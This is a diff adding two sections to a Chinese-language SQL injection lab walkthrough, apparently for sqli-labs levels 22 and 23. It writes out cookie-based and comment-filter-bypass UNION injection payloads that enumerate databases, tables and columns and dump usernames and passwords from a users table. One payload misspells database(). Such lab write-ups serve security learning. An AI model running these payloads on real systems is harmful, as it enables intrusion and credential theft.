@@ -753,7 +753,207 @@ nice
 
 接下来，根据那条语句，构造sql语句就可以了，再把语句构造成base64密文，复制到cookie那里
 
-## 22. 
+## 22. 基于错误的双引号注入
+
+继续抓包看一下
+
+![image](https://user-images.githubusercontent.com/76896357/115098719-1e5eb000-9f64-11eb-9aa4-685fc509e6c2.png)
+
+还是cookie注入
+
+* 查看闭合方式
+```
+-admin"
+```
+![image](https://user-images.githubusercontent.com/76896357/115098782-857c6480-9f64-11eb-851e-3be941b5d54d.png)
+
+根据报错说明是“”
+![image](https://user-images.githubusercontent.com/76896357/115098777-7e555680-9f64-11eb-8deb-dde277dfb4d7.png)
+
+* 查看有没有回显
+```
+-admin" union select 1,2,3 #
+```
+![image](https://user-images.githubusercontent.com/76896357/115098829-d1c7a480-9f64-11eb-8475-1445288586fa.png)
+
+* 查库
+```
+-admin" union select 1,2,database() #//加密
+```
+![image](https://user-images.githubusercontent.com/76896357/115098863-09cee780-9f65-11eb-9b85-fdfc374be5ee.png)
+
+* 查表
+```
+-admin" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115098921-5d413580-9f65-11eb-8372-ed7eb6ca17c4.png)
+
+![image](https://user-images.githubusercontent.com/76896357/115098749-4fd77b80-9f64-11eb-808a-874b63b532f8.png)
+
+剩下的就类似之前的语句
+
+## 23. 过滤掉注释
+
+* 看一下闭合方式
+```
+?id=admin'
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099006-e2c4e580-9f65-11eb-83d9-1ad8feb18c50.png)
+
+显然是‘闭合
+
+* 看下有没有回显
+```
+?id=admin' union select 1,2,3 --+
+```
+![image](https://user-images.githubusercontent.com/76896357/115099050-16a00b00-9f66-11eb-96b0-5fb40f2eaf43.png)
+
+没有
+
+* 看下会不会报错
+
+```
+?id=1' and 1=1 --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099104-5e269700-9f66-11eb-9ff3-845c0eac76bc.png)
+
+看到这里，发现报错就没变过，而且根据报错也能猜到，估计是把注释给过滤掉了。。。
+
+那么就有自己来造闭合语句‘’
+
+* 查库
+```
+?id='union select 1,2,3'
+?id='union select 1,2,databae()'
+
+?id= ' union select 1,2,group_concat(database()) from information_schema.schemata where 1 or '1'= '
+```
+![image](https://user-images.githubusercontent.com/76896357/115099163-b9f12000-9f66-11eb-96be-e19b2e1e4739.png)
+
+全部的数据库
+
+![image](https://user-images.githubusercontent.com/76896357/115099205-f3299000-9f66-11eb-8a88-cbce1f8c2225.png)
+
+* 查表
+
+```
+?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099249-51ef0980-9f67-11eb-99da-5b74bcff9ab5.png)
+
+* 查列
+
+```
+?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' or '1'= '
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099310-b4e0a080-9f67-11eb-887f-ba54aa6ffb57.png)
+
+* 查字段
+
+```
+?id='union select 1,group_concat(username),group_concat(password) from security.users where 1 or '1'= '//把句子结构补全不然不让过
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099371-0557fe00-9f68-11eb-8652-629a221ff6c8.png)
+
+过。。。。
+
+## 24. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
